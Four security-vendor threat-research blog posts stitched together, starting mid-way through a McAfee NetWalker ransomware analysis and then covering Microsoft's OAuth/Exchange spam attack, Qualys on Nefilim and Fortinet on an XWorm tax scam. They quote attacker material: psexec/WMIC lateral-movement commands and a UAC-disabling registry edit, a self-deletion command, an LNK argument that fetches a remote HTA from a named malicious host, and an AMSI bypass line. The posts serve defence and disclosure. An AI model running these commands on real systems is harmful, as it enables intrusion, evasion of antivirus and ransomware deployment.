Such overlap could suggest a stronger link between the current NetWalker version and the other ransomware versions from Eriknetwalker, possibly even explaining the name overlap. 
To execute the analysis, we used several tools one of which was the binary visualization tool Veles, which dynamically translates binary information into an abstract visualization that allows us to identify and compare patterns. 
The different types of ransomware we began analyzing were the variants of Amnesia, Scarab, and NetWalker. 
Figure 27.
Flat visualization of binary data of the different ransomware variants Figure 28.
3D visualization of binary data of the different ransomware variants Visualizing data in such a manner is a way to use the human brain to quickly identify patterns and be able to draw comparisons between objects.
In our case, we see that, based on the binary data visualized in Figures 27 and 28, the ransomware binaries do yield differences that we cannot ignore. 
Figure 29.
Comparison of source code results Figure 29 shows the results of a source code similarity analysis led on the different variants of ransomware named in the figure itself.
Interesting enough, Scarab and Amnesia show a higher overlap with Buran and Zeppelin than the early NetWalker samples.
The percentages shown are the amount of code that is similar between two variants. 
As illustrated in the overview, the September 2019 NetWalker version has a different codebase from the ErikNetWalker-linked ransomware variants.
This finding disproves our earlier hypothesis that NetWalker is linked to the older Amnesia variants based on code overlap. 
Often, research teams do not publish their results when it disproves their own hypothesis.
However, for the sake of transparency, we decided to include our research efforts. 
YARA Rules We uploaded a YARA rule to detect almost all the samples observed in the wild to date. 
Indicators of Compromise During our investigation we have observed numerous IoCs linked to NetWalker ransomware.
To obtain them please visit our McAfee ATR GitHub site, or get the latest NetWalker IoCs and intelligence on many other threats with McAfee Insights. 
MITRE ATT&CK Techniques 
The below techniques were based on our research and complemented with research from industry peers. 
Initial Access Exploit Public-Facing Application (T1190) : Exploit Tomcat, Exploit WebLogic Spear phishing Attachment (T1566.001):
Phishing email Valid Accounts (T1078): RDP compromised Execution PowerShell (T1059.001):
PowerShell Script Command and Scripting Interpreter:
Windows Command Shell (003) Service Execution (T1569.002):
PsExec Native API (T1106): Use Windows API functions to inject DLL Windows Management Instrumentation (T1047) Persistence Registry Run Key (T1547.001):
Place a value on RunOnce key Modify Registry key (T1112): Create its own registry key in \SOFTWARE\<uniquename> Privilege Escalation Exploitation for Privilege Escalation (T1068): CVE-2020-0796, CVE-2019-1458, CVE-2017-0213, CVE-2015-1701 Process Injection (T1055.001): Reflective DLL Injection Defense Evasion Disabling Security Tools (T1562.001): ESET AV Remover, Trend Micro’s Security Agent Uninstall Tool, Microsoft Security Client Uninstall Process Injection (T1055.001): Reflective DLL Injection Deobfuscate/Decode Files or Information (T1140) Obfuscated Files or Information (T1027): PowerShell Script uses Base64 and hexadecimal encoding and XOR-encryption Credential Access Credential Dumping (T1003): Mimikatz, Mimidogz, Mimikittenz, Windows Credentials Editor, Pwdump, LaZagne Brute Force (T1110.001): NLBrute Discovery Network Service Scanning (T1046): SoftPerfect Network Scanner Security Software Discovery (T1518.001) 
System Information Discovery (T1082) Lateral Movement Third-Party Software (T1072): TeamViewer, Anydesk Service Execution (T 1569.002): PsExec Lateral Tool Transfer (T1570) Collection Data from information repositories (T1213) Data from local system (T1005) Data from network shared drive (T1039) Command and Control Ingress Tool Transfer (T1105) 
Impact Data Encrypted (T1486): NetWalker Ransomware Inhibit System Recovery (T1490): Shadow Copies Deleted Service Stop (T1489) Conclusion Ransomware has evolved into a lucrative business for threat actors, from underground forums selling ransomware, to offering services such as support portals to guide victims through acquiring crypto currency for payment, to the negotiation of the ransom.
McAfee’s Advanced Threat Research team has analysed the NetWalker ransomware and have been following its evolution from the initial sighting of the Mailto ransomware to its redevelopment into the NetWalker ransomware.
The recent shift to a business-centric model of Ransomware-as-a-Service is a clear sign that it is stepping up, so it seems that the NetWalker group is following in the footsteps of REvil and other successful RaaS groups.
The ransomware developers have proven the ability to refocus and capitalize on current world events and develop lures to help ensure the effectiveness of the ransomware, which has allowed them to become selective of their affiliates by limiting access to the ransomware to only those with vetted access to large organizations.
As development of the ransomware continues, we have witnessed recent shifts in activity that closely follow in the footsteps of other ransomware developments, including threatening victims with the release of confidential information if the ransom is not met. 
McAfee ATR is actively monitoring ransomware threats and will continue to update McAfee MVISION Insights and its social networking channels with new and current information.
MVISION Insights is the only proactive endpoint security solution that simultaneously prioritizes and predicts threats that matter to our customers while offering prescriptive guidance on what to do in their local environment.
Want to stay ahead of the adversaries?
Check out McAfee MVISION Insights for more information.
If you want to experience some of the MVISION Insights capabilities, go the Preview of MVISION Insights where you can select the top threat information that is available. 
Authored by: Thibault Seret, Valentine Mairet, Jeffrey Sman, Alfred Alvarado, Tim Hux, Alexandre Mundo, John Fokker, Marc Rivero Lopez and Thomas Roccia. 
The post Take a “NetWalk” on the Wild Side appeared first on McAfee Blog. 
title: Malicious OAuth applications used to compromise email servers and spread spam - Microsoft Security Blog url: http://www.microsoft.com/security/blog/2022/09/22/malicious-oauth-applications-used-to-compromise-email-servers-and-spread-spam/ Microsoft researchers recently investigated an attack where malicious OAuth applications were deployed on compromised cloud tenants and then used to control Exchange servers and spread spam.
The investigation revealed that the threat actor launched credential stuffing attacks against high-risk accounts that didn’t have multi-factor authentication (MFA) enabled and leveraged the unsecured administrator accounts to gain initial access.
The unauthorized access to the cloud tenant enabled the actor to create a malicious OAuth application that added a malicious inbound connector in the email server.
The actor then used the malicious inbound connector to send spam emails that looked like they originated from the targets’ domain.
The spam emails were sent as part of a deceptive sweepstakes scheme meant to trick recipients into signing up for recurring paid subscriptions. 
Microsoft has been monitoring the rising popularity of OAuth application abuse.
One of the first observed malicious usage of OAuth applications in the wild is consent phishing.
Consent phishing attacks aim to trick users into granting permissions to malicious OAuth apps to gain access to user’s legitimate cloud services (mail servers, files storage, management APIs, etc.).
In the past few years, Microsoft has observed that more and more threat actors, including nation-state actors, have been using OAuth applications for different malicious purposes – command-and-control (C2) communication, backdoors, phishing, redirections, and so on. 
This recent attack involved a network of single-tenant applications installed in compromised organizations being used as the actor’s identity platform to perform the attack.
As soon as the network was revealed, all the related applications were taken down and notifications to customers were sent, including recommended remediation steps. 
This blog presents the technical analysis of this attack vector and the succeeding spam campaign attempted by the threat actor.
It also provides guidance for defenders on protecting organizations from this threat, and how Microsoft security technologies detect it. Figure 1.
Overview of the attack chain.
The time between application deployment and usage varied; there were cases where the actor took months before using the application.
Initial access For the attack to succeed, the threat actor needed to compromise cloud tenant users with sufficient permissions that would allow the actor to create an application in the cloud environment and give it admin consent.
The actor performed credential stuffing attacks against their targets, attempting to access users with the global admin role.
The authentication attempts, which originated from a single IP address, were launched against the Azure Active Directory PowerShell application (app ID: 1b730954-1685-4b74-9bfd-dac224a7b894).
The same application was later used to deploy the rest of the attack. 
Based on the success ratio of the authentication attempts, it is inferred that the attacker used a dump of compromised credentials.
The investigation also revealed that 86% of the compromised tenants had at least one admin with a real-time high risk score, which means they were flagged by Azure AD Identity Protection to be most likely compromised.
It is also important to note that all the compromised admins didn’t have MFA enabled, which could have stopped the attack.
These observations amplify the importance of securing accounts and monitoring for high-risk users, especially those with high privileges. 
Deploying malicious OAuth application Once the threat actor gained access to privileged users, their next step was to set up the malicious application.
Based on analysis of the event user agent (Swagger-Codegen/1.4.0.0/csharp) and how quickly the deployment of the application was done, it is likely that the actor ran a PowerShell script to perform the following Azure Active Directory (AAD) management activities in all targeted tenants: Register a new single–tenant application with the naming convention of [domain name]_([a-zA-Z]){3} (for example: Contoso_GhY)Add the legacy permission Exchange.ManageAsApp which can be used for app-only authentication of Exchange Online PowerShell moduleGrant admin consent to the above permissionGive global admin and Exchange admin roles to the previously registered applicationAdd application credentials (key/certificate/both) The threat actor added their own credentials to the OAuth application, which enabled them to access the application even if the initially compromised global administrator changed their password. 
The activities mentioned gave the threat actor control of a highly privileged application.
It was observed that the threat actor did not always use the application right after it was deployed.
In some cases, it took weeks or months before the application was utilized.
Also, in organizations that didn’t monitor for suspicious applications, the applications were deployed for months and used multiple times by the threat actor. 
Modifying Exchange settings The threat actor used the privileged application to authenticate the Exchange Online PowerShell module and modify the Exchange settings of the compromised server.
There were two modifications which allowed them to perform the next step in the attack chain: Create a new inbound connector Connectors are a collection of instructions that customize the way email flows to and from organizations using Microsoft 365 or Office 365.
Most organizations using Microsoft 365 and Office 365 don’t need custom connectors for regular mail flow, but some use it when they need to process messages from another messaging system that’s not running Exchange, or if they have a network appliance that performs policy checks and then routes messages to their Exchange server. 
The threat actor set a new inbound connector with the naming convention Ran_([a-zA-Z]){5} (for example Ran_xAFzd).
The purpose of the inbound connector was to allow mails from certain IPs (that are related to the attacker’s infrastructure) to flow through the victim’s Exchange server.
This allowed the threat actor to send emails that looked like they originated from the compromised Exchange domain.
The configuration information for the newly created connectors were seen in Exchange audit event New-InboundConnector.
The following table shows the configuration parameters in the audit event related to this change: NameValue“Name”“Ran_jBelh”“Enabled”“True”“CloudServicesMailEnabled”“True”“RestrictDomainsToCertificate”“False”“SenderDomains”“smtp:*;1”“SenderIPAddresses”“170.75.174.97;170.75.172.8;170.75.170.69;170.75.174.95; 54.39.94.145;149.56.200.36;158.69.21.185;66.70.201.131”“RestrictDomainsToIPAddresses”“True”“ConnectorSource”“HybridWizard”“EFSkipIPs”“170.75.174.97;170.75.172.8;170.75.170.69;170.75.174.95; 54.39.94.145;149.56.200.36;158.69.21.185;66.70.201.131”“TreatMessagesAsInternal”“False”“ConnectorType”“OnPremises”“RequireTls”“False”Create transport rules Transport rules (also known as mail flow rules) are sets of actions that can be taken on any mail that flows in the organization.
The threat actor utilized this feature to set 12 new transport rules with the naming convention of Test01 to Test012.
Each of these transport rules were responsible for deleting the following specific headers from every mail that flowed in the organization: X-MS-Exchange-ExternalOriginalInternetSenderX-MS-Exchange-SkipListedInternetSenderReceived-SPFReceivedARC-Authentication-ResultsARC-Message-SignatureDKIM-SignatureARC-SealX-MS-Exchange-SenderADCheckX-MS-Exchange-Authentication-ResultsAuthentication-ResultsX-MS-Exchange-AntiSpam-MessageData-ChunkCountBy deleting these headers, the attacker tried defense evasion to prevent security products or email providers detecting or blocking their emails and increase the success rate of the spam campaign.
The configuration information for the newly created transport rules were seen in Exchange audit event New-TransportRule.
The following table shows the configuration parameters in the audit event related to this change: NameValue“Name”“Test06”“SenderAddressLocation”“Header”“RemoveHeader”“ARC-Message-Signature”These modifications to the Exchange server settings allowed the threat actor to perform their primary goal in the attack: sending out spam emails.
After each spam campaign, the actor deleted the malicious inbound connector and transport rules to prevent detection, while the application remained deployed in the tenant until the next wave of the attack (in some cases, the app was dormant for months before it was reused by the threat actor). 
Figure 2.
An example of the PowerShell script used for setting new Exchange connector and transport rulesSpam email campaign sent through Exchange connector The actor behind this attack has been actively running spam email campaigns for many years.
Based on our research, this actor has sent high volumes of spam emails in short timeframes through other methods, such as connecting to mail servers from rogue IP addresses or sending directly from legitimate cloud-based bulk email sending infrastructure. 
The actor’s motive was to propagate deceptive sweepstakes spam emails designed to trick recipients into providing credit card details and signing up for recurring subscriptions under the guise of winning a valuable prize.
While the scheme possibly led to unwanted charges for targets, there was no evidence of overt security threats such as credential phishing or malware distribution. 
The spam campaign carried the hallmarks of this actor: programmatically generated messages containing two visible hyperlinked images in the email body, as well as dynamic and randomized content injected within the HTML body of each mail message to evade spam filters. Figure 3.
An example of spam email sent through the Exchange inbound connectorThe hyperlinked images within the spam messages implied to recipients that they were eligible for a prize.
Once clicked, the hyperlink directed recipients to a website where they were asked to complete a survey and provide credit card details to pay for the shipping of their prize. 
Familiar brand logos, names, and websites were used throughout the spam email, likely to give an illusion of legitimacy. 
Figure 4.
Clicking the image in the spam email leads to this website indicating a prize has been wonThe fine print, visible only by scrolling to the very bottom of a subsequent page, revealed that in providing their credit card information, recipients were not paying a shipping fee for their prize, but were in fact agreeing to be charged fees for several paid subscription services in order to enter into a sweepstakes for the prize.
It is likely the threat actor’s main motive was potential financial gain from people who fell victim to this deceptive sweepstakes spam campaign. 
Figure 5.
The fine print shows the chance to win a prize is only through a sweepstakes after paying feesLikely to achieve scale and further maximize the chances of successful email delivery, the actor triggered this spam campaign from cloud-based outbound email infrastructure outside of Microsoft, mainly Amazon SES and Mail Chimp.
These email platforms enable sending of mass bulk email, normally for marketing and other legitimate purposes. 
The campaign also utilized techniques to generate unique dynamic URLs underpinning the hyperlinked images within each spam email message, as shown in the examples below. 
Figure 6.
Examples of dynamic URL generation (domain obfuscated)This spam campaign exclusively targeted consumer email accounts.
In the case of spam messages sent to Microsoft-hosted consumer email accounts (outlook.com), the spam emails were moved into customers’ junk folders before they could be viewed and clicked. 
Mitigations While the follow-on spam campaign targets consumer email accounts, this attack targets enterprise tenants to use as infrastructure for this campaign.
This attack thus exposes security weaknesses that could be used by other threat actors in attacks that could directly impact affected enterprises. 
As the main initial access vector of the attack was to obtain the admin’s credentials, we recommend organizations take the following steps to reduce their attack surface: Mitigate credential guessing attacks risks A key step in reducing the attack surface is securing the identity infrastructure.
The most common initial access vector observed in this attack was account compromise through credential stuffing, and all the compromised administrator accounts did not have MFA enabled.
Implementing security practices that strengthen account credentials such as enabling MFA raises the cost of an attack. 
Enable conditional access policies Conditional access policies are evaluated and enforced every time the user attempts to sign in.
Organizations can protect themselves from attacks that leverage stolen credentials by enabling policies such as device compliance or trusted IP address requirements. 
Enable continuous access evaluation Continuous access evaluation (CAE) revokes access in real time when changes in user conditions trigger risks, such as when a user is terminated or moves to an untrusted location. 
Enable security defaults While some of the features mentioned above require paid subscriptions, the security defaults in Azure AD, which is mainly for organizations using the free tier of Azure Active Directory licensing, are sufficient to better protect the organizational identity platform, as they provide preconfigured security settings such as MFA, protection for privileged activities, and others. 
Detections for related techniques Leveraging its cross-signal capabilities, Microsoft 365 Defender alerts customers using Microsoft Defender for Office 365, Microsoft Defender for Cloud Apps, Application governance add-on, and Azure Active Directory Identity Protection to detect the techniques covered in the attack through the attack chain.
Each product can provide a different aspect for protection to cover the techniques observed in this attack: Microsoft 365 Defender Suspicious email-sending pattern from new Exchange inbound connector – This alert is generated when a suspicious email-sending pattern originating from a new Exchange inbound connector is detected.
This behavior might suggest that an attacker set a malicious inbound connector to allow anonymous relay through the organization’s Exchange server. 
Recommended reading to response for malicious connector incidents: New transport rule removing antispam header –
This alert is generated when a new transport rule to remove antispam header is detected. 
Suspicious inbound connector and transport rule created to remove sender email headers – This alert is generated when a suspicious inbound connector and transport rule is created to remove headers that identify the true source address of sender.
This might indicate a spam campaign is ongoing from the organization’s mailbox. 
Suspicious Azure AD app creation – This alert is generated when a user account creates Azure Active Directory OAuth application with suspicious characteristics, as observed in this campaign. 
Azure AD app registration by risky user – This alert is generated when a user account with high risk score as calculated by AAD Identity Protection is creating a new OAuth application and grants admin consent to it. 
Microsoft Defender for Office 365 Microsoft Defender for Office 365 detects threat activity associated with this spamming campaign through the following email security alerts.
Note, however, that these alerts may also be triggered by unrelated threat activity.
We’re listing them here because we recommend that these alerts be investigated and remediated immediately. 
Email messages from a campaign removed after delivery​. This alert is generated when any messages associated with a campaign are delivered to mailboxes in an organization.
Microsoft removes the infected messages from Exchange Online mailboxes using zero-hour auto purge (ZAP) if this event occurs. 
Microsoft Defender for Cloud Apps Activity from suspicious IP addresses.
This alert is generated when there is activity from an IP address that has been identified as risky by Microsoft Threat Intelligence or by the organization.
These IP addresses were identified as being involved in malicious activities, such as performing password spray, botnet C2, and may indicate a compromised account. 
Activity from a password-spray associated IP address.
This alert is generated when a successful sign-in from an IP address that had been identified as participating in password spray was observed. 
App governance App governance is an add-on to Microsoft Defender for Cloud Apps, which can detect malicious OAuth applications that make sensitive Exchange Administrative activities along with other threat detection alerts.
Activity related to this campaign will trigger the following alert: OAuth app with suspicious metadata has Exchange permission​. This alert is generated when a line of business OAuth app with suspicious metadata has privilege to manage permission over Exchange, which can lead an OAuth App to perform data collection or exfiltration activities or attempts to access and retrieve sensitive information. 
Azure AD Identity Protection Azure AD Identity Protection automatically detects and remediates identity-based risks.
It detects suspicious sign-in attempts and raises any of the following alerts: Anomalous Token. 
This alert flags a token’s unusual characteristics, such as its token lifetime or played from an unfamiliar location.
Unfamiliar sign-in properties. 
In this phishing campaign, the attackers used multiple proxies or VPNs originating from various countries or regions unfamiliar to the target user.
This alert flags anomalies in the token claims, token age, and other authentication attributes.
Anonymous IP address. 
This alert flag sign-in attempts from anonymous IP addresses (for example, Tor browser or anonymous VPN).Hunting queries To locate related activity, Microsoft 365 Defender customers can run the following advanced hunting queries: Applications given the “Exchange.ManageAsApp” permission: CloudAppEvents | where Timestamp > ago(30d) | where ActionType == "Add app role assignment to service principal.
" | where RawEventData.
ResultStatus == "Success" | where RawEventData has "dc50a0fb-09a3-484d-be87-e023b12c6440" //Exchange.ManageAsApp
Role Id | project Timestamp, AccountObjectId,AccountDisplayName, AppId = RawEventData.ModifiedProperties[0].NewValue, AppName = RawEventData.
ModifiedProperties[6].NewValue New transport rules that remove anti-spam headers from emails: CloudAppEvents | where ActionType == "New-TransportRule" | mvexpand Param = RawEventData.
Parameters | where Param.
Name == "RemoveHeader" and Param.
Value contains "X-MS-Exchange-AntiSpam-MessageData" | project Timestamp, AccountObjectId, AccountDisplayName, ServicePrincipalId = tostring(RawEventData.
AppId) 
title: Nefilim Ransomware url: https://blog.qualys.com/vulnerabilities-threat-research/2021/05/12/nefilim-ransomware Over the past year there has been a rise in extortion malware that focuses on stealing sensitive data and threatening to publish the data unless a ransom is paid.
This technique bypasses some of the mitigations put in place, such as backups, which would allow IT organizations to recover data without having to pay such a ransom.
One of the more popular ransomware families over the last few months to switch to this extortion tactic was Nefilim. 
About Nefilim Ransomware Nefilim ransomware emerged in March 2020 when Nemty operators quit the ransomware as a service model to concentrate their energy on more targeted attacks with more focused resources.
The author of the Nemty ransomware also appears to have shared Nemty’s source code with others.
According to Vitali Kremez and ID Ransomware’s Michael Gillespie, the new Nefilim ransomware appears to be based on Nemty’s code.
Sharing many notable similarities with Nemty version 2.5, Nefilim has the capabilities to move laterally within networks. 
Nefilim targets vulnerabilities such as CVE-2019-11634 and CVE-2019-19781 in Citrix gateway devices, identified in December 2019 and patched in January 2020.
The hackers target organizations using the unpatched or poorly secured Citrix remote-access technology, stealing data and then deploying ransomware. 
Nefilim attackers exfiltrate sensitive data before encryption.
When ransoms are not paid, they have been known to shame victims by posting their data on the dark web. Technical Details Initial access Nefilim ransomware is distributed through exposed Remote Desktop Protocol (RDP) setups by brute-forcing them and using other known vulnerabilities for initial access, i.e. vulnerabilities in Citrix gateway devices.
Nefilim places a heavy emphasis on Remote Desktop Protocols. 
Once an attacker gains a foothold on the victim system, the attacker drops and executes its components such as anti-antivirus, exfiltration tools, and finally Nefilim itself. 
Lateral Movement Among the various tactics and techniques used by the attackers, they rely on tools such as PsExec to remotely execute commands in their victims’ networks.
It has been also seen that Nefilim uses other tools to gather credentials that include Mimikatz, LaZagne, and NirSoft’s NetPass.
It uses bat files to stop services/kill processes as shown in below image, and the stolen credentials are used to reach high-value machines like servers.
The hackers work to move around the network before deploying their ransomware to find out where juicier data may be stored.
They exfiltrate sensitive data before encryption. 
Some of the commands that execute by the attacker Start copy kill.bat \destinationip\c$\windows\temp Start psexec.exe \destinationip -u domain\username\ -p password -d
-h -r mstdc -s -accepteula -nobanner c:\windows\teamp\Kill.bat Start psexec.exe -accepteula \destinationip -u domain\username\ -p password reg add HKLM\software\Microsoft\Windows\CurrentVersion\Policies\System /v
EnableLUA /t REG_DWORD /d
0 /F WMIC /node: \destinationip /username:”domain\username” /password:”password” process CALL CREATE “cmd.exe /c
copy \sourceip\c$\windows\temp C:\WINDOWS\TEMP\kill.bat" WMIC /node: \destinationip /username:”domain\username”
/password:”password” process CALL CREATE “cmd.exe /c C:\WINDOWS\TEMP\kill.bat" Below images shows A batch file to stop services/kill processes Fig.
1 Stopping Services Fig.
2 Killing Process Data exfiltration It copies data from servers/shared directories to the local directory and compresses with dropped 7zip binary.
It also drops and installs MegaSync to exfiltrate data. 
Ransomware Execution The Nefilim malware uses AES-128 encryption to lock files and their blackmail payments are made via email.
After encryption, it dropped the ransomware note by named ‘NEFILIM-DECRYPT.txt’.
All files are encrypted with the extension of (.NEFILIM).
It appends AES encrypted key at end of the encrypted file.
This AES encryption key will then be encrypted by an RSA-2048 public key that is embedded in the ransomware executable.
In addition to the encrypted AES key, the ransomware will also add the “NEFILIM” string as a file marker to all encrypted files. Fig.
3 Crypto API’s in Nefilim IOC In the Below image malware create Mutex Fig.
4 Creating Mutex Some of the Anti-debugging techniques: Ransomware uses anti-debugging method by calling the IsDebuggerPresent function.
This function detects if the calling process is being debugged by a user-mode debugger.
It also makes use of API GetTickCount / QueryPerformanceCounter to get the number of ticks since the last system reboot.
It checks for a timestamp and compare it to another one after a few malicious instructions, in order to check if there was a delay. 
Fig.
5
Anti debugging API Fig.
6 Anti debugging API Shell execute: Nefilim delete itself from the target systems after infection with the help of ShellExecute API "C:\Windows\System32\cmd.exe" /c
timeout /t
3 /nobreak && del "C:\Users\admin\Download{ransomware_filename}.exe" /s /f /q Fig. 7 Self Deletion High-Profile Attacks Taking a Toll Nefilim’s highest-profile ransomware attack to date was against the Australian shipping organization, Toll Group.
The attack was first published on May 5, 2020.
Two months previously, Toll Group was a victim of a Netwalker ransomware attack.
In both cases, Toll Group refused to pay the ransom.
In response, Nefilim leaked sensitive Toll Group data and popularized that Toll Group had failed to employ full cybersecurity protocols even after the Netwalker attack, potentially making the organization vulnerable to more attacks.
This demonstrates how Nefilim will keep the pressure on its victims to pay ransoms. 
Mitigation or Additional Important Safety Measures Network Keep strong and unique passwords for login accounts.
Disable RDP if not used.
If required change RDP port to a non-standard port.
Configure firewall in following way,Deny access to Public IPs to important ports (in this case RDP port 3389)Allow access to only IP’s which are under your control.
Use VPN to access the network, instead of exposing RDP to the Internet.
Possibility implement Two Factor Authentication (2FA).Set lockout policy which hinders credentials guessing.
Create a separate network folder for each user when managing access to shared network folders. 
Take regular data backup Protect systems from ransomware by periodically backing up important files regularly and keep a recent backup copy offline.
Encrypt your backup.
If your computer gets infected with ransomware, your files can be restored from the offline backup once the malware has been removed.
Always use a combination of online and offline backup.
Do not keep offline backups connected to your system as this data could be encrypted when ransomware strike. 
Keep software updated Always keep your security software (antivirus, firewall, etc.)
up to date to protect your computer from new variants of malware.
Regularly patch and update applications, software, and operating systems to address any exploitable software vulnerabilities.
Do not download cracked/pirated software as they risk backdoor entry for malware into your computer.
Avoid downloading software from untrusted P2P or torrent sites.
In most cases, they are malicious software. 
Having minimum required privileges Don’t assign Administrator privileges to users.
Most importantly, do not stay logged in as an administrator unless it is strictly necessary.
Also, avoid browsing, opening documents, or other regular work activities while logged in as an administrator. 
Monitor for Lateral Movement To spot these attacks, keep an eye out not only for attack code but also monitor for any evidence of lateral movement and data exfiltration within the environment.
To determine if an organization has been hit by Nefilim, check remote-access systems for any signs of unauthorized access.
To identify potential data exfiltration, additionally identify unusual host outbound traffic patterns. 
Nefilim TTP Map Initial AccessExecutionDefense EvasionCredential AccessDiscoveryLateral MovementExfiltrationImpactExploit
Public-Facing Application (T1190)Native API (T1106)File Deletion (T1070.004)OS Credential Dumping (T1003)Software Discovery: Security Software Discovery (T1518.001)Lateral Tool Transfer (T1570)Exfiltration Over Web Service: Exfiltration to Cloud Storage (T1567.002)Data Encrypted for impact (T1486)Impair Defenses: Disable or Modify Tools (T1562:001)Remote System Discovery (T1018)Inhibit system Recovery (T1490)System Information Discovery (T1082)File and Directory Discovery (T1083) Indicators of Compromise (IOCs) SHA256 8be1c54a1a4d07c84b7454e789a26f04a30ca09933b41475423167e232abea2bb8066b7ec376bc5928d78693d236dbf47414571df05f818a43fb5f52136e8f2e3080b45bab3f804a297ec6d8f407ae762782fa092164f8ed4e106b1ee7e249537de8ca88e240fb905fc2e8fd5db6c5af82d8e21556f0ae36d055f623128c3377b227fa0485e34511627a8a4a7d3f1abb6231517be62d022916273b7a51b80a173bac058dbea51f52ce154fed0325fd835f35c1cd521462ce048b41c9b099e1e5353ee5805bc5c7a98fb5d522b15743055484dc47144535628d102a4098532cd55ab834f599c6ad35fcd0a168d93c52c399c6de7d1c20f33e25cb1fdb25aec9c652e25bdd600695cfed0d4ee3aca4f121bfebf0de889593e6ba06282845cf39ea35a0bced28fd345f3ebfb37b6f9a20cc3ab36ab168e079498f3adb25b41e156f7a73032ece59af3316c4a64490344ee111e4cb06aaf00b4a96c10adfdd65559908c7dfde13ade4b13350ae290616d7c2f4a87cbeac9a3886e90a175ee40fb641D4492a9eb36f87a9b3156b59052ebaf10e264d5d1ce4c015a6b0d205614e58e3B8066b7ec376bc5928d78693d236dbf47414571df05f818a43fb5f52136e8f2efcc2921020690a58c60eba35df885e575669e9803212f7791d7e1956f9bf8020 References https://www.zdnet.com/article/nemty-ransomware-operation-shuts-down/https://www.bleepingcomputer.com/news/security/new-nefilim-ransomware-threatens-to-release-victims-data/https://www.bleepingcomputer.com/news/security/nemty-ransomware-punishes-victims-by-posting-their-stolen-data/https://www.trendmicro.com/vinfo/au/security/news/cybercrime-and-digital-threats/updated-analysis-on-nefilim-ransomware-s-behaviorhttps://www.bankinfosecurity.com/blogs/toll-group-data-leaked-following-second-ransomware-incident-p-2902https://www.tollgroup.com/toll-it-systems-updateshttps://www.picussecurity.com/resource/blog/how-to-beat-nefilim-ransomware-attacks 
title: Deja Vu All Over Again: Tax Scammers at Large url: https://www.fortinet.com/blog/threat-research/tax-scammers-at-large Affected Platforms: WindowsImpacted Users: Windows usersImpact: Compromised machines are under the control of the threat actor, potentially resulting in stolen personally identifiable information (PII), credential theft, financial loss, etc.Severity Level:
Medium The time has come again for tax returns—and tax-based scams.
Targeting calendar-based events enables threat actors to prepare ahead of time and have a new selection of targets on rotation. 
This blog covers a few examples of malware that take advantage of tax season.
Although such attacks may seem repetitive to the casual observer, threat actors would not continue to target taxpayers if previous attacks had not been successful. 
XWorm Delivered Through Tax Scam FortiGuard Labs became aware of a curious-looking archive file hosted on an open directory on www[.]farmaciasmv[.]com/citrix/2022%20tax_documents[.]zip, which has since been removed. 
Figure 1.
Empty open directory that hosted 2022%20tax_documents[.]zip 
The zip file contains the following files: Annual Withdrawal.xlsx (SHA2: 59bb292565ebc86800e5e4d625d3c19f98afe2261d3da1a8e2f9b45ec76153a0) Robert tax_docs.pdf (SHA2: a9f4b054ea128529c62a8ff25f1439651f045e443adf5ff11fb5bd29f1333a7a) Figure 2.
Contents of the 2022%20tax_documents[.]zip The XLSX file is a benign decoy file that contains financial data from an unknown source. 
Figure 3.
Contents of the Annual Withdrawal.xlsx The other file is malicious.
Despite Robert tax_docs.pdf having a PDF icon, it is different from what it seems.
The file is actually a link (LNK) file that launches the legitimate script (C:\Windows\System32\SyncAppvPublishingServer.vbs), which has a known issue of taking command line arguments.
The link file exploits this issue and feeds the legitimate script with the following command line argument to download and execute a remote “note.hta”: ;\W_\*2\\\m_h_a_e ('http'+'://datacenter002[.]myftp[.]biz/documents/note.
'+'hta') 
The downloaded note.hta uses PowerShell to download another remote file hosted on hxxp://datacenter002[.]myftp[.]biz/documents/note[.]gif, which was not available at the time of our investigation.
Finding another note.gif (SHA2: 0487ef401345aa17c6aaeac23151219863e1363f82fe76edd0066bbf3fb07715) based on the same infection chain let us continue our quest to the payload. 
note.gif is a PowerShell script that creates the following files: C:\Users\Public\onedrive.vbs (SHA2: 92C1767EE4A954B93D6AFA9AE83FE82B82D2867D919D0359DCF2C8DA75FB8C7C) 
C:\Users\Public\test.vbs (SHA2: ADBA59F1495965684EEB4C5DAAD67F732FEB5E9183AE05EB869E20C88CAD7327) C:\Users\Public\onedrive.ps1 (SHA2: 7A9705A424A634A321DB9F36B61D74B953A44D44EDC429F7641BF830870572FC) Once launched, it executes the onedrive.vbs and test.vbs files. 
test.vbs creates %usertemp%\Note.txt, a clean file containing fake "QUARTERLY TAX PAYMENTS FOR 2022" data. Figure 4.
Note.txt containing fake “QUARTERLY TAX PAYMENTS FOR 2022” data onedrive.vbs runs the previously created onedrive.ps1 filled with activities designed to hamper Windows Defender.
It first executes the following known AMSI (Antimalware Scripting Interface) bypass: 
[Ref].Assembly.GetType(‘System.
Management.
Automation.
AmsiUtils’) 
.GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true) It also disables AMSI by hijacking the COM server, changing it from "%windir%\system32\amsi.dll" to "C:\IDontExist.dll".
The PowerShell script then performs the following actions to alter Windows Defender settings: Adds the following exclusions to Windows DefenderExtensions: .bat, .ppam, .xls, .docx, .bat, .exe, .vbs, .js 
File paths: C:\, D:\, E:\ Processes: explorer.exe, kernel32.dll, aspnet_compiler.exe, cvtres.exe, CasPol.exe, csc.exe, Msbuild.exe, ilasm.exe, InstallUtil.exe, jsc.exe, Calc.exe, powershell.exe, rundll32.exe, conhost.exe, Cscript.exe, mshta.exe, cmd.exe, DefenderisasuckingAntivirus, wscript.exe Allows known Windows Defender Threat IDs to execute Disables Windows Defender Attack Surface Reduction (ASR) rules Disables the following Windows Defender features:Intrusion Prevention System IO AV Protection (does not scan downloaded files and attachments) 
Realtime monitoring Script scanning Controlled folder access protection PUA protection Scheduled scan Sets Network Protection to audit mode in Windows Defender (allows users to visit known malicious sites but logs them in the event log) 
Disables MAPS (Microsoft Active Protection Service) reporting Never submits samples to Microsoft Allows severe/high/moderate/low-level threats to execute Disables the "administrator in Admin Approval Mode" user type (disables UAC prompts) Stops the WinDefend service (Windows Defender) Disables the startup of the WinDefend service Deletes the WinDefend service Creates a user named "System32" with the password “123” (no quotes) Adds the System32 user to both the "administrators" group and the "Remote Desktop Users" group Stops the Microsoft Defender Antivirus Network Inspection Service (WdNisSvc) Turns off Windows Firewall The PowerShell script finally uses reflective loading to load a binary into memory that injects XWorm RAT version 3.1. 
